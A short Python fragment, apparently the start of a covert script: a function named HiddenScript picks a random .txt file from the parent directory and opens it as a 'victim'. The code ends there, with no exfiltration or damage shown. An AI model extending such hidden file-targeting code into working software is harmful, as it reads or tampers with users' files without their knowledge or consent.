import os
from random import choice, randint
from Tree import Tree

def HiddenScript(self):
    filepath = os.getcwd() #note to self: this is how you get a file's location (most of the time, at least)
    t = Tree(os.path.dirname(filepath))
    victim = open(os.path.dirname(filepath) + "\\" + choice(t.searchExtension(".txt")), mode='r')